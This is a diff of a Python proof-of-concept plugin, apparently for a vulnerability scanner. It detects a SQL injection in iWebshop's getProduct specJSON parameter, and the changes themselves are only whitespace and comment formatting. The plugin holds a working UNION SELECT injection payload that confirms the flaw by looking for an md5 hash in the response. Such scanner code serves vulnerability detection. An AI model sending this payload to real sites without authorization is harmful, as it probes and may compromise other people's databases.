@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'iWebshop_0006' # 平台漏洞编号，留空
+    vuln_id = 'iWebshop_0006'  # 平台漏洞编号，留空
     name = 'iWebshop SQL注射'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = 'Unknown'  # 漏洞公布时间
     desc = '''
         iWebshop /index.php?controller=site&action=getProduct&specJSON= SQL注射漏洞。
@@ -17,6 +18,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'iWebshop'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '60202a0c-e195-4725-a6fd-d990eaed0897'
@@ -30,9 +32,9 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             hh = hackhttp.hackhttp()
-            #refer:http://www.wooyun.org/bugs/wooyun-2010-062061
+            # refer:http://www.wooyun.org/bugs/wooyun-2010-062061
             payload = '''/index.php?controller=site&action=getProduct&specJSON={"judger":"1'%20and%201=0%20union%20select%20md5(1),2,3,4,5,6,7,8,9%20and%20'1'%20=%20'1"}'''
             url = self.target + payload
             code, head, body, errcode, _url = hh.http(url)
@@ -47,6 +49,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
